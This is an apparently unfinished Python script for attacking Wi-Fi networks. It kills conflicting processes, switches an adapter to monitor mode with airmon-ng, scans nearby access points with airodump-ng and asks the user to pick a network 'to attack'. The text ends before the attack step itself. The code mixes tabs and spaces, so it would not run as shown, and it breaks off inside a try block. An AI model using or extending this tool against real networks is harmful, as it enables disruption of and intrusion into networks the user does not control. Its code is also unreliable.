import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

acitve_wireless_networks = [] #create an empty list

def check_for_essid(essid, lst): #test if ESSID is already in the list
	check_status = True
	
	if len(lst) == 0:
		return check_status
		
	for item in lst : #this will run if there are access points in the list
		if essid in item["ESSID"]:
		 check_status = False     
	return check_status
	
if not "SUDO_UID" in os.environ.keys(): #check whether user run with sudo previledges.
	print('You need root previledges. Try with sudo')
	exit()

for file_name in os.listdir(): #to remove csv files before exxecuting the script
	if ".csv" in file_name:
		print("Yo have to remove .csv files in your directory")
        directory = os.getcwd()
		try: 
            os.mkdir(directory + "/backup/") #creating backup folder
		except:
            print('Backup folder is already in the directory')
		
		timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
		
wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0: #if no wifi adapter connected
	print("Please connect a wifi adapter")
    exit()
	
print("Following Wifi interfaces are available") 
for index, item in enumerate(check_wifi_result): #select a wifi adapter if wifi adapters are available
	print(f"{index} - {item}")

while True:
	wifi_interface_choice = input("please select the interface for the attack : ")
	try:
        if check_wifi_result[int(wifi_interface_choice)]:
		break
	except:
        print("Please select a number in chouces list")
		
hacknic = check_wifi_result[int(wifi_interface_choice)]
print("Wifi adapter connected!")

kill_conflict_process = subprocess.run(["sudo", "airmon-ng", "check", "kill"]) #killing all conflicting processes using airmong-ng
print("Putting wiifi adapter to monitor mode......")
put_in_monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic]) #putting wifi adapter to monitor mode

#discovering access points
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try: 
    while True:
		subprocess.call("clear", shell=True) #cleaning the screen before print the network interfaces
		
		for file_name in os.listdir():
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
			if ".csv" in file_name:
			 with open(file_name) as csv_h:
                    csv_h.seek(0)
					csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames) #to create a list of dictionary with the key as specified in the filename
                    for row in csv_reader:
                        if row["BSSID"]=="BSSID":
							 pass
                        elif row["BSSID"] == "Station MAC":
							break
                        elif check_for_essid(row["ESSID"], acitve_wireless_networks):
							acitve_wireless_networks.append(row)
		print("Scanning. Press Ctrl +c when you want to select the wireless network to attack:\n")
		print("No |\tBSSID              |\tChannel|\tESSID                         |")
		print("___|\t___________________|\t_______|\t______________________________|")
		for index, item in enumerate(acitve_wireless_networks):
			print(f"{index}\t {item['BSSID']}\t {item['channel'].strip()}\t\t{item['ESSID']}")

		time.sleep(1)
		
except KeyboardInterrupt:
	print("Ready to make choice..")
	
#Ensure the input choice is valid
while True:
	choice= input("Please select a choice from above: ")
	try:
		if acitve_wireless_networks[int(choice)]:
			break